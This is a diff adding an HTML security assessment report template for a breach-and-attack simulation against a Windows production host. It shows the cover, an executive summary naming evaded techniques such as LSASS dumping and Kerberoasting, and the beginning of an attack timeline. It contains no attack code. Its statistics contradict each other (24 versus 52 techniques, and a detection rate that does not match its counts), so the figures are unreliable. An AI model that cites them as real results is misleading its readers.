@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Audspect BAS — Security Assessment Report</title>
+<style>
+/* ── Reset ── */
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-print-color-adjust:exact;print-color-adjust:exact;font-size:13px}
+body{font-family:"Segoe UI",system-ui,-apple-system,Helvetica,Arial,sans-serif;
+  color:#1a2332;background:#fff;line-height:1.6;
+  font-variant-numeric:tabular-nums;-webkit-font-smoothing:antialiased}
+code{font-family:"Cascadia Code","Consolas","SF Mono",monospace;font-size:0.85em}
+
+/* ── Page ── */
+.page{width:210mm;min-height:297mm;margin:0 auto;background:#fff;
+  position:relative;page-break-after:always;break-after:page;overflow:hidden}
+.page:last-child{page-break-after:avoid;break-after:avoid}
+@media screen{body{background:#c8d0da;padding:24px 0}
+  .page{box-shadow:0 6px 32px rgba(0,0,0,0.22);margin:0 auto 28px;border-radius:2px}}
+@media print{body{background:#fff;padding:0}
+  .page{width:100%;margin:0;box-shadow:none}
+  .fc,.finding-card,.tl-item{page-break-inside:avoid;break-inside:avoid}
+  thead{display:table-header-group}}
+
+/* ── Cover ── */
+.cover{background:#0b1420;min-height:297mm;display:flex;flex-direction:column;position:relative}
+.cover-grain{position:absolute;inset:0;opacity:0.03;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  background-size:200px}
+.cover-accent{position:absolute;right:-100px;top:-100px;width:520px;height:520px;
+  border-radius:50%;border:70px solid rgba(13,148,136,0.07);pointer-events:none}
+.cover-accent2{position:absolute;right:40px;bottom:80px;width:280px;height:280px;
+  border-radius:50%;border:40px solid rgba(37,99,235,0.05);pointer-events:none}
+.cover-header{padding:40px 48px 0;position:relative;z-index:1}
+.clogo{display:flex;align-items:center;gap:11px}
+.clogo-mark{width:34px;height:34px;background:linear-gradient(135deg,#0d9488 0%,#2563eb 100%);
+  border-radius:8px;display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-size:15px;color:#fff;flex-shrink:0}
+.clogo-name{font-size:1.15rem;font-weight:800;color:#fff;letter-spacing:-0.03em}
+.clogo-name span{color:#0d9488}
+.clogo-sub{font-size:0.58rem;text-transform:uppercase;letter-spacing:0.16em;color:#4a6a8a;margin-top:1px}
+.cover-body{flex:1;padding:0 48px;display:flex;flex-direction:column;justify-content:center;
+  position:relative;z-index:1}
+.cover-eyebrow{font-size:0.62rem;text-transform:uppercase;letter-spacing:0.2em;
+  color:#0d9488;font-weight:700;margin-bottom:12px}
+.cover-title{font-size:2.8rem;font-weight:900;color:#fff;letter-spacing:-0.04em;
+  line-height:1.02;margin-bottom:8px}
+.cover-sub{font-size:0.95rem;color:#6a8aaa;margin-bottom:32px;line-height:1.6}
+.cover-rule{width:56px;height:3px;background:linear-gradient(90deg,#0d9488,#2563eb);
+  border-radius:2px;margin-bottom:30px}
+.cover-grid{display:grid;grid-template-columns:1fr 1fr;border:1px solid rgba(255,255,255,0.07);
+  border-radius:10px;overflow:hidden;margin-bottom:30px}
+.cg-cell{padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.05);
+  border-right:1px solid rgba(255,255,255,0.05)}
+.cg-cell:nth-child(even){border-right:none}
+.cg-cell:nth-last-child(-n+2){border-bottom:none}
+.cg-label{font-size:0.57rem;text-transform:uppercase;letter-spacing:0.1em;
+  color:#4a6a8a;font-weight:700;margin-bottom:4px}
+.cg-value{font-size:0.84rem;font-weight:600;color:#d8e8f8}
+.cover-badges{display:flex;gap:9px;flex-wrap:wrap}
+.cb{display:inline-flex;align-items:center;gap:6px;padding:6px 13px;
+  border-radius:20px;font-size:0.64rem;font-weight:700;letter-spacing:0.04em}
+.cb-conf{background:rgba(220,166,0,0.1);border:1px solid rgba(220,166,0,0.28);color:#e0bc30}
+.cb-live{background:rgba(13,148,136,0.1);border:1px solid rgba(13,148,136,0.25);color:#0d9488}
+.cover-bottom{padding:24px 48px;border-top:1px solid rgba(255,255,255,0.06);
+  display:flex;justify-content:space-between;align-items:center;position:relative;z-index:1}
+.cover-bottom-copy{font-size:0.62rem;color:#2a4a6a;line-height:1.6}
+.cover-scores{display:flex;gap:22px}
+.cs-item{text-align:center}
+.cs-num{font-size:1.45rem;font-weight:900;line-height:1}
+.cs-lbl{font-size:0.56rem;text-transform:uppercase;letter-spacing:0.1em;color:#3a5a7a;margin-top:2px}
+
+/* ── Inner Page Scaffolding ── */
+.inner{padding:0 48px 28px;min-height:297mm;display:flex;flex-direction:column}
+.ph{display:flex;justify-content:space-between;align-items:center;
+  padding:16px 0 14px;border-bottom:1px solid #e8edf4;margin-bottom:24px}
+.ph-left{display:flex;align-items:center;gap:16px}
+.ph-logo{font-size:0.78rem;font-weight:800;color:#0b1420}
+.ph-logo span{color:#0d9488}
+.ph-sep{width:1px;height:14px;background:#d0d8e4}
+.ph-title{font-size:0.68rem;font-weight:600;color:#4a6a8a}
+.ph-right{display:flex;align-items:center;gap:16px}
+.ph-endpoint{font-size:0.62rem;color:#7a9ab8}
+.ph-class{font-size:0.58rem;font-weight:800;text-transform:uppercase;
+  letter-spacing:0.08em;color:#dc2626;background:#fff0f0;border:1px solid #fca5a5;
+  padding:2px 8px;border-radius:3px}
+.ph-page{font-size:0.62rem;color:#7a9ab8}
+.pf{margin-top:auto;padding-top:12px;border-top:1px solid #f0f4f8;
+  display:flex;justify-content:space-between;align-items:center;font-size:0.58rem;color:#9ab0c8}
+
+/* ── Section headings ── */
+.stag{font-size:0.57rem;text-transform:uppercase;letter-spacing:0.2em;color:#0d9488;font-weight:700;margin-bottom:5px}
+.stitle{font-size:1.28rem;font-weight:900;color:#0b1420;letter-spacing:-0.025em;
+  line-height:1.15;margin-bottom:16px;padding-left:13px;border-left:4px solid #0d9488}
+.sh2{font-size:0.88rem;font-weight:800;color:#0b1420;margin:18px 0 10px;letter-spacing:-0.01em}
+.sh3{font-size:0.63rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:#6e7681;margin:14px 0 7px}
+
+/* ── Narrative box ── */
+.narrative{background:#f8faff;border:1px solid #dce8f8;border-left:4px solid #2563eb;
+  border-radius:0 10px 10px 0;padding:18px 20px;margin-bottom:18px}
+.narrative-label{font-size:0.57rem;text-transform:uppercase;letter-spacing:0.14em;
+  color:#2563eb;font-weight:800;margin-bottom:9px}
+.narrative p{font-size:0.86rem;color:#1a2332;line-height:1.75}
+.narrative strong{color:#0b1420}
+
+/* ── Three Things ── */
+.three-things{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:18px}
+.tt-card{border-radius:10px;padding:16px 16px 14px;border:1px solid}
+.tt-num{font-size:2rem;font-weight:900;line-height:1;margin-bottom:6px}
+.tt-head{font-size:0.78rem;font-weight:800;margin-bottom:5px;line-height:1.3}
+.tt-body{font-size:0.71rem;line-height:1.55}
+
+/* ── KPI row ── */
+.kpi-row{display:grid;grid-template-columns:repeat(4,1fr);gap:11px;margin-bottom:18px}
+.kpi{background:#fff;border:1px solid #e7eaf0;border-radius:10px;
+  padding:15px 15px 13px;position:relative;overflow:hidden}
+.kpi::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:var(--c,#0d9488);border-radius:3px 3px 0 0}
+.kpi-lbl{font-size:0.57rem;text-transform:uppercase;letter-spacing:0.1em;
+  color:#9aa5b5;font-weight:700;margin-bottom:7px}
+.kpi-val{font-size:1.55rem;font-weight:900;color:var(--c,#0d9488);
+  letter-spacing:-0.02em;line-height:1;margin-bottom:5px}
+.kpi-sub{font-size:0.61rem;color:#9aa5b5}
+.kpi-bar{height:4px;background:#eef1f6;border-radius:2px;margin-top:7px;overflow:hidden}
+.kpi-bar-fill{height:100%;border-radius:2px;background:var(--c,#0d9488)}
+
+/* ── Callouts ── */
+.callout{border-radius:8px;padding:11px 15px;margin-bottom:10px;
+  font-size:0.77rem;line-height:1.6;display:flex;gap:10px;align-items:flex-start}
+.callout-icon{flex-shrink:0;margin-top:1px;font-size:0.9rem}
+.co-danger{background:#fff5f5;border:1px solid #fecaca;color:#991b1b}
+.co-warn{background:#fffbeb;border:1px solid #fde68a;color:#92400e}
+.co-ok{background:#f0fdf9;border:1px solid #d1fae5;color:#065f46}
+
+/* ── Risk hero ── */
+.risk-hero{background:linear-gradient(130deg,#0b1420 0%,#152338 100%);
+  border-radius:13px;padding:24px 28px;margin-bottom:18px;
+  display:flex;align-items:center;gap:28px;position:relative;overflow:hidden}
+.rh-ring{position:absolute;right:-50px;top:-50px;width:200px;height:200px;
+  border-radius:50%;border:28px solid rgba(255,255,255,0.025)}
+.rh-donut{flex-shrink:0;position:relative;width:110px;height:110px}
+.rh-donut svg{display:block}
+.rh-center{position:absolute;inset:0;display:flex;flex-direction:column;
+  align-items:center;justify-content:center}
+.rh-num{font-size:1.75rem;font-weight:900;color:#fff;line-height:1}
+.rh-denom{font-size:0.62rem;color:#4a6a8a;line-height:1;margin-top:1px}
+.rh-info{flex:1}
+.rh-class{font-size:0.6rem;text-transform:uppercase;letter-spacing:0.14em;color:#4a6a8a;font-weight:700;margin-bottom:4px}
+.rh-label{font-size:1.35rem;font-weight:900;letter-spacing:-0.02em;margin-bottom:7px}
+.rh-desc{font-size:0.76rem;color:#7a9ab8;line-height:1.6;max-width:340px}
+.rh-pills{display:flex;gap:7px;margin-top:10px;flex-wrap:wrap}
+.rh-pill{padding:3px 11px;border-radius:20px;font-size:0.62rem;font-weight:700;border:1px solid}
+
+/* ── Donut row ── */
+.donut-row{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:18px}
+.donut-card{background:#f7f9fc;border:1px solid #e7eaf0;border-radius:10px;
+  padding:18px 14px;display:flex;flex-direction:column;align-items:center}
+.donut-lbl{font-size:0.6rem;text-transform:uppercase;letter-spacing:0.1em;
+  color:#9aa5b5;font-weight:700;margin-bottom:10px}
+.donut-svg-wrap{position:relative;width:100px;height:100px;margin-bottom:10px}
+.donut-svg-wrap svg{display:block}
+.donut-inner{position:absolute;inset:0;display:flex;flex-direction:column;
+  align-items:center;justify-content:center}
+.donut-pct{font-size:1.25rem;font-weight:900;line-height:1}
+.donut-tag{font-size:0.56rem;color:#9aa5b5;margin-top:2px}
+.donut-legend{width:100%;display:flex;flex-direction:column;gap:4px}
+.dl-row{display:flex;align-items:center;justify-content:space-between;font-size:0.63rem}
+.dl-dot{width:7px;height:7px;border-radius:50%;margin-right:5px;flex-shrink:0}
+.dl-label{flex:1;color:#6e7681;display:flex;align-items:center}
+.dl-val{font-weight:700;color:#0b1420}
+
+/* ── Tactic bar table ── */
+.tbar-table{width:100%;border-collapse:collapse;margin-bottom:8px}
+.tbar-table td{padding:6px 8px;border-bottom:1px solid #f0f4f8;vertical-align:middle}
+.tbar-name{font-size:0.74rem;font-weight:600;color:#1a2332;min-width:145px}
+.tbar-bg{flex:1;height:8px;background:#eef1f6;border-radius:4px;overflow:hidden;min-width:90px}
+.tbar-fill{height:100%;border-radius:4px}
+.tbar-pct{font-size:0.72rem;font-weight:800;min-width:36px;text-align:right}
+.tbar-count{font-size:0.62rem;color:#9aa5b5;min-width:68px;text-align:right}
+
+/* ── MITRE Heatmap ── */
+.hm-wrap{overflow-x:auto;margin-bottom:12px}
+.hm{display:flex;gap:5px;min-width:580px}
+.hm-col{flex:1;min-width:56px}
+.hm-tactic{font-size:0.5rem;font-weight:700;text-transform:uppercase;letter-spacing:0.05em;
+  color:#5a7a9a;text-align:center;padding:4px 2px 5px;
+  border-bottom:2px solid #e7eaf0;margin-bottom:4px;line-height:1.3}
+.hm-cell{height:21px;border-radius:3px;margin-bottom:2px;font-size:0.48rem;font-weight:700;
+  color:#fff;display:flex;align-items:center;justify-content:center;
+  letter-spacing:0.02em;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;padding:0 2px}
+.hm-cell.P{background:#0d9488}.hm-cell.D{background:#2563eb}
+.hm-cell.M{background:#dc2626}.hm-cell.N{background:#e7eaf0;color:#9aa5b5}
+.hm-legend{display:flex;gap:14px;margin-top:6px;margin-bottom:16px}
+.hml-item{display:flex;align-items:center;gap:5px;font-size:0.62rem;color:#6e7681}
+.hml-dot{width:11px;height:11px;border-radius:2px}
+
+/* ── Attack Timeline ── */
+.timeline{position:relative;padding-left:28px;margin-bottom:18px}
+.timeline::before{content:'';position:absolute;left:8px;top:6px;bottom:6px;
+  width:2px;background:linear-gradient(180deg,#2563eb,#0d9488)}
+.tl-item{position:relative;margin-bottom:14px}
+.tl-item:last-child{margin-bottom:0}
+.tl-dot{position:absolute;left:-23px;top:4px;width:14px;height:14px;border-radius:50%;
+  border:2px solid #fff;box-shadow:0 0 0 2px var(--dc,#6e7681);background:var(--dc,#6e7681)}
+.tl-time{font-size:0.62rem;font-weight:700;color:#9aa5b5;margin-bottom:2px;font-family:monospace}
+.tl-phase{font-size:0.78rem;font-weight:800;color:#0b1420;margin-bottom:2px}
+.tl-tech{font-size:0.68rem;color:#6e7681;margin-bottom:2px}
+.tl-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;
+  border-radius:3px;font-size:0.6rem;font-weight:700}
+
+/* ── Execution Context table ── */
+.ctx-table{width:100%;border-collapse:collapse;font-size:0.72rem;margin-bottom:14px}
+.ctx-table thead th{background:#f0f4f8;color:#5a7a9a;text-transform:uppercase;
+  font-size:0.56rem;letter-spacing:0.08em;font-weight:700;text-align:left;
+  padding:8px 10px;border-bottom:1.5px solid #e0e7ef}
+.ctx-table td{padding:8px 10px;border-bottom:1px solid #f0f4f8;vertical-align:middle}
+.priv-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;
+  border-radius:3px;font-size:0.6rem;font-weight:700;border:1px solid}
+.priv-system{background:rgba(220,38,38,0.08);border-color:rgba(220,38,38,0.3);color:#dc2626}
+.priv-admin{background:rgba(234,88,12,0.08);border-color:rgba(234,88,12,0.3);color:#ea580c}
+.priv-user{background:rgba(37,99,235,0.08);border-color:rgba(37,99,235,0.3);color:#2563eb}
+.priv-fallback{background:rgba(217,119,6,0.08);border-color:rgba(217,119,6,0.3);color:#d97706}
+.priv-skipped{background:#f3f4f6;border-color:#d1d5db;color:#6b7280}
+
+/* ── Finding Cards ── */
+.fc{border-radius:10px;margin-bottom:14px;overflow:hidden;border:1px solid #e7eaf0;
+  border-left-width:5px}
+.fc.fc-critical{border-left-color:#dc2626}
+.fc.fc-high{border-left-color:#ea580c}
+.fc.fc-medium{border-left-color:#d97706}
+.fc.fc-low{border-left-color:#0d9488}
+
+.fc-header{padding:12px 16px;display:flex;align-items:flex-start;gap:12px;
+  background:#fafbfc;border-bottom:1px solid #f0f4f8}
+.fc-sev-block{padding:4px 10px;border-radius:5px;font-size:0.62rem;font-weight:900;
+  text-transform:uppercase;letter-spacing:0.08em;color:#fff;flex-shrink:0;margin-top:1px}
+.fc-sev-block.critical{background:#dc2626}
+.fc-sev-block.high{background:#ea580c}
+.fc-sev-block.medium{background:#d97706}
+.fc-sev-block.low{background:#0d9488}
+.fc-heading{flex:1}
+.fc-name{font-size:0.9rem;font-weight:800;color:#0b1420;line-height:1.25;margin-bottom:3px}
+.fc-name.critical{font-size:1.02rem}
+.fc-tid{font-size:0.65rem;color:#9aa5b5;font-family:monospace;font-weight:500}
+.fc-verdict{flex-shrink:0}
+
+/* vbadge */
+.vb{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;
+  border-radius:4px;font-size:0.62rem;font-weight:800;letter-spacing:0.04em}
+.vb-missed{background:#fee2e2;color:#dc2626}
+.vb-detected{background:#dbeafe;color:#1d4ed8}
+.vb-prevented{background:#dcfce7;color:#16a34a}
+.vb-error{background:#fef3c7;color:#d97706}
+.vb-skipped{background:#f3f4f6;color:#6b7280}
+
+.fc-body{padding:14px 16px}
+.fc-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fc-detail-row{display:flex;gap:8px;margin-bottom:7px;align-items:flex-start}
+.fc-detail-label{font-size:0.6rem;font-weight:700;text-transform:uppercase;
+  letter-spacing:0.08em;color:#9aa5b5;min-width:88px;padding-top:2px;flex-shrink:0}
+.fc-detail-value{font-size:0.75rem;color:#1a2332;line-height:1.5}
+
+/* Evidence block */
+.evidence-block{background:#0d1621;border-radius:7px;padding:11px 13px;font-family:monospace}
+.ev-header{font-size:0.56rem;text-transform:uppercase;letter-spacing:0.14em;
+  color:#2563eb;font-weight:700;margin-bottom:8px}
+.ev-row{display:flex;gap:6px;margin-bottom:4px;font-size:0.63rem}
+.ev-key{color:#4a6a8a;min-width:70px;flex-shrink:0}
+.ev-val{color:#a0c4e0;word-break:break-all;line-height:1.4}
+.ev-val.ok{color:#0d9488}
+.ev-val.bad{color:#f87171}
+.ev-val.warn{color:#fbbf24}
+.ev-val.code{color:#c084fc}
+
+.fc-remediation{background:#f0fdf9;border-left:3px solid #0d9488;
+  padding:10px 13px;margin-top:10px;border-radius:0 7px 7px 0}
+.fc-rem-label{font-size:0.57rem;font-weight:700;text-transform:uppercase;
+  letter-spacing:0.1em;color:#0d9488;margin-bottom:4px}
+.fc-rem-text{font-size:0.74rem;color:#1a2332;line-height:1.6}
+
+/* ── Remediation Roadmap ── */
+.roadmap{display:grid;grid-template-columns:1fr 1fr 1fr;gap:13px;margin-bottom:18px}
+.rm-lane{border-radius:10px;overflow:hidden;border:1px solid #e7eaf0}
+.rm-header{padding:11px 14px;font-size:0.64rem;font-weight:800;
+  text-transform:uppercase;letter-spacing:0.1em;color:#fff}
+.rm-body{padding:8px 14px}
+.rm-item{display:flex;align-items:flex-start;gap:7px;padding:7px 0;
+  border-bottom:1px solid #f0f4f8;font-size:0.72rem;color:#1a2332;line-height:1.45}
+.rm-item:last-child{border-bottom:none}
+.rm-bullet{width:17px;height:17px;border-radius:4px;flex-shrink:0;margin-top:1px;
+  display:flex;align-items:center;justify-content:center;font-size:0.58rem;
+  font-weight:800;color:#fff}
+
+/* ── Tables (general) ── */
+table{width:100%;border-collapse:collapse;font-size:0.77rem;margin-bottom:14px}
+thead th{background:#f0f4f8;color:#5a7a9a;text-transform:uppercase;font-size:0.57rem;
+  letter-spacing:0.08em;font-weight:700;text-align:left;padding:8px 11px;
+  border-bottom:1.5px solid #e0e7ef}
+td{padding:8px 11px;border-bottom:1px solid #f0f4f8;vertical-align:middle;color:#1a2332}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:#f7f9fc}
+
+/* Severity dots */
+.sev{display:inline-flex;align-items:center;gap:4px;font-size:0.72rem;font-weight:600}
+.sev-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.sd-c{background:#dc2626}.sd-h{background:#ea580c}
+.sd-m{background:#d97706}.sd-l{background:#0d9488}
+
+/* Score improvement table */
+.sim-row-now{background:#fff8f8}
+.sim-bold{font-weight:700}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════ COVER ══════════════════ -->
+<div class="page">
+<div class="cover">
+  <div class="cover-grain"></div>
+  <div class="cover-accent"></div>
+  <div class="cover-accent2"></div>
+
+  <div class="cover-header">
+    <div class="clogo">
+      <div class="clogo-mark">A</div>
+      <div>
+        <div class="clogo-name">Aud<span>spect</span> BAS</div>
+        <div class="clogo-sub">Breach &amp; Attack Simulation Platform</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="cover-body">
+    <div class="cover-eyebrow">Security Assessment Report</div>
+    <div class="cover-title">Endpoint Security<br>Posture Assessment</div>
+    <div class="cover-sub">ATT&amp;CK-Aligned Breach &amp; Attack Simulation<br>Executive &amp; Technical Report — Confidential</div>
+    <div class="cover-rule"></div>
+
+    <div class="cover-grid">
+      <div class="cg-cell">
+        <div class="cg-label">Organisation</div>
+        <div class="cg-value">Enterprise Financial Group</div>
+      </div>
+      <div class="cg-cell">
+        <div class="cg-label">Endpoint / Environment</div>
+        <div class="cg-value">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      </div>
+      <div class="cg-cell">
+        <div class="cg-label">Scenario Executed</div>
+        <div class="cg-value">APT36 Kill-Chain + Selective ART</div>
+      </div>
+      <div class="cg-cell">
+        <div class="cg-label">Assessment Window</div>
+        <div class="cg-value">28 Jun 2026 &nbsp;10:22 – 10:35 UTC</div>
+      </div>
+      <div class="cg-cell">
+        <div class="cg-label">Framework</div>
+        <div class="cg-value">MITRE ATT&amp;CK v15 · Atomic Red Team</div>
+      </div>
+      <div class="cg-cell">
+        <div class="cg-label">Run ID</div>
+        <div class="cg-value" style="font-family:monospace;font-size:0.78rem">run-18ba273d</div>
+      </div>
+    </div>
+
+    <div class="cover-badges">
+      <div class="cb cb-conf">⚠ CONFIDENTIAL — Authorised Recipients Only</div>
+      <div class="cb cb-live">&#x2714; Live Simulation · Agent v1.7</div>
+    </div>
+  </div>
+
+  <div class="cover-bottom">
+    <div class="cover-bottom-copy">
+      Audspect BAS Platform &nbsp;·&nbsp; v1.7.1 &nbsp;·&nbsp; Classification: CONFIDENTIAL<br>
+      This document contains sensitive security posture information. Do not forward or distribute.
+    </div>
+    <div class="cover-scores">
+      <div class="cs-item">
+        <div class="cs-num" style="color:#0d9488">71%</div>
+        <div class="cs-lbl">Prevention</div>
+      </div>
+      <div class="cs-item">
+        <div class="cs-num" style="color:#2563eb">58%</div>
+        <div class="cs-lbl">Detection</div>
+      </div>
+      <div class="cs-item">
+        <div class="cs-num" style="color:#ea580c">42</div>
+        <div class="cs-lbl">Risk Score</div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ EXECUTIVE SUMMARY ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 2 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 1</div>
+  <div class="stitle">Executive Summary</div>
+
+  <!-- ── Three headline numbers ── -->
+  <div class="three-things">
+    <div class="tt-card" style="background:#fff5f5;border-color:#fecaca">
+      <div class="tt-num" style="color:#dc2626">7</div>
+      <div class="tt-head" style="color:#991b1b">Techniques fully evaded controls</div>
+      <div class="tt-body" style="color:#7f1d1d">Of 24 simulated. 3 are Critical severity. Attacker can act on these immediately.</div>
+    </div>
+    <div class="tt-card" style="background:#fff8f0;border-color:#fed7aa">
+      <div class="tt-num" style="color:#ea580c">Cred&nbsp;Access</div>
+      <div class="tt-head" style="color:#9a3412">Weakest tactic — highest business risk</div>
+      <div class="tt-body" style="color:#7c2d12">LSASS dump + Kerberoasting both evaded. Domain credentials accessible in under 90 seconds.</div>
+    </div>
+    <div class="tt-card" style="background:#f0fdf9;border-color:#d1fae5">
+      <div class="tt-num" style="color:#0d9488">4 hrs</div>
+      <div class="tt-head" style="color:#065f46">To close the 2 most critical gaps</div>
+      <div class="tt-body" style="color:#064e3b">Enable Credential Guard + LSA Protection. Low effort, maximum impact. Do this first.</div>
+    </div>
+  </div>
+
+  <!-- ── Analyst Narrative ── -->
+  <div class="narrative">
+    <div class="narrative-label">&#9654; Analyst Assessment</div>
+    <p>
+      This assessment executed <strong>24 ATT&amp;CK techniques</strong> across 10 tactic categories on
+      <strong>WIN-PROD-01</strong> (Production environment) between 10:22 and 10:35 UTC.
+      Of 24 techniques, <strong>17 were prevented or detected</strong>; <strong>7 succeeded with no security
+      control response</strong> — 3 Critical, 4 High severity.
+    </p>
+    <p style="margin-top:8px">
+      <strong>Credential Access is the primary exposure:</strong> LSASS memory dumping (T1003.001) and
+      Kerberoasting (T1558.003) both executed without triggering any alert. An attacker reaching this
+      endpoint can harvest domain credentials in under 90 seconds and authenticate as any domain user,
+      including privileged accounts. <strong>Defense Evasion is the second critical gap</strong> —
+      5 of 7 evasion techniques executed using built-in Windows binaries (regsvr32, rundll32) that
+      signature-based controls cannot detect without behavioral rules.
+    </p>
+    <p style="margin-top:8px">
+      <strong>Immediate action required:</strong> Enable Windows Credential Guard and LSA Protection
+      (estimated 4 hours). This closes the two highest-risk findings. The Defense Evasion gaps require
+      Microsoft ASR rule enablement within 30 days. All 7 gaps have specific, actionable remediations
+      in Section 5 of this report.
+    </p>
+  </div>
+
+  <!-- ── Risk Hero + KPIs ── -->
+  <div class="risk-hero">
+    <div class="rh-ring"></div>
+    <div class="rh-donut">
+      <svg width="110" height="110" viewBox="0 0 110 110">
+        <circle cx="55" cy="55" r="44" fill="none" stroke="rgba(255,255,255,0.06)" stroke-width="13"/>
+        <circle cx="55" cy="55" r="44" fill="none" stroke="#dc2626" stroke-width="13"
+          stroke-dasharray="276.5 276.5" transform="rotate(-90 55 55)"/>
+        <circle cx="55" cy="55" r="44" fill="none" stroke="#d97706" stroke-width="13"
+          stroke-dasharray="116.1 276.5" transform="rotate(-90 55 55)"/>
+      </svg>
+      <div class="rh-center">
+        <div class="rh-num" style="color:#d97706">42</div>
+        <div class="rh-denom">/ 100</div>
+      </div>
+    </div>
+    <div class="rh-info">
+      <div class="rh-class">Overall Risk Score</div>
+      <div class="rh-label" style="color:#d97706">Medium Risk</div>
+      <div class="rh-desc">52 techniques simulated. 37 prevented, 8 detected-only, 7 fully evaded. Industry benchmark for BFSI sector: 62% prevention (Picus Blue Report 2025). Your prevention rate of 71% is above benchmark; detection at 58% needs improvement.</div>
+      <div class="rh-pills">
+        <div class="rh-pill" style="background:rgba(13,148,136,0.15);border-color:rgba(13,148,136,0.35);color:#0d9488">71% Prevention ↑ above benchmark</div>
+        <div class="rh-pill" style="background:rgba(37,99,235,0.15);border-color:rgba(37,99,235,0.35);color:#2563eb">58% Detection ↓ needs improvement</div>
+        <div class="rh-pill" style="background:rgba(220,38,38,0.15);border-color:rgba(220,38,38,0.35);color:#dc2626">7 Control Gaps</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="kpi-row">
+    <div class="kpi" style="--c:#0d9488">
+      <div class="kpi-lbl">Prevention Score</div>
+      <div class="kpi-val">71.2%</div>
+      <div class="kpi-sub">37 of 52 techniques blocked</div>
+      <div class="kpi-bar"><div class="kpi-bar-fill" style="width:71%"></div></div>
+    </div>
+    <div class="kpi" style="--c:#2563eb">
+      <div class="kpi-lbl">Detection Score</div>
+      <div class="kpi-val">57.7%</div>
+      <div class="kpi-sub">Alert on 8 of 15 unblocked</div>
+      <div class="kpi-bar"><div class="kpi-bar-fill" style="width:58%"></div></div>
+    </div>
+    <div class="kpi" style="--c:#dc2626">
+      <div class="kpi-lbl">Critical Gaps</div>
+      <div class="kpi-val">3</div>
+      <div class="kpi-sub">Executed with zero response</div>
+      <div class="kpi-bar"><div class="kpi-bar-fill" style="width:13%"></div></div>
+    </div>
+    <div class="kpi" style="--c:#d97706">
+      <div class="kpi-lbl">Mean Time to Detect</div>
+      <div class="kpi-val">3.2 s</div>
+      <div class="kpi-sub">Avg across 8 detected events</div>
+      <div class="kpi-bar"><div class="kpi-bar-fill" style="width:42%"></div></div>
+    </div>
+  </div>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 2 of 12</span>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ ATTACK TIMELINE ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 3 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 2</div>
+  <div class="stitle">Attack Simulation Timeline</div>
+  <p style="font-size:0.8rem;color:#6e7681;margin-bottom:18px">
+    Chronological sequence of the attack simulation. Timestamps show UTC wall-clock time during the run.
+    Red events represent successful attacker actions with no control response.
+  </p>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:28px">
+    <div>
+      <div class="sh3">Kill-Chain Progression</div>
+      <div class="timeline">
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#2563eb"></div>
+          <div class="tl-time">10:22:15 UTC</div>
+          <div class="tl-phase">Simulation Started</div>
+          <div class="tl-tech">Agent WIN-PROD-01 received run command</div>
+          <div style="margin-top:4px"><span class="tl-badge" style="background:#dbeafe;color:#1d4ed8">&#9654; Live Run</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#0d9488"></div>
+          <div class="tl-time">10:22:18 UTC</div>
+          <div class="tl-phase">Execution Phase</div>
+          <div class="tl-tech">T1059.001 PowerShell · T1059.003 CMD</div>
+          <div style="margin-top:4px"><span class="tl-badge" style="background:#dcfce7;color:#16a34a">&#10003; Prevented</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#0d9488"></div>
+          <div class="tl-time">10:22:26 UTC</div>
+          <div class="tl-phase">Persistence Attempted</div>
+          <div class="tl-tech">T1053.005 Scheduled Task · T1543.003 Service</div>
